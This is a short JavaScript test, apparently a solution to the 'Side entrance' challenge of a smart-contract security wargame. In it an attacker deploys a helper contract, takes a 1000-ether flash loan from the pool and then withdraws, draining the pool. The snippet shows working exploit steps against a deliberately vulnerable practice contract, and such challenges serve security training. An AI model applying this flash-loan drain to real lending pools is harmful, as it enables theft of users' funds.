...
const Lender = contract.fromArtifact('Lender');
...
describe('[Challenge] Side entrance', function () {
  ...
  it('Exploit', async function () {
    this.lender = await Lender.new(this.pool.address, { from: attacker });

    //await this.lender.deposit({ value: ether('10'), from: attacker });
    await this.lender.flashLoan(ether('1000'), { from: attacker });

    await this.lender.withdraw({ from: attacker });
  });
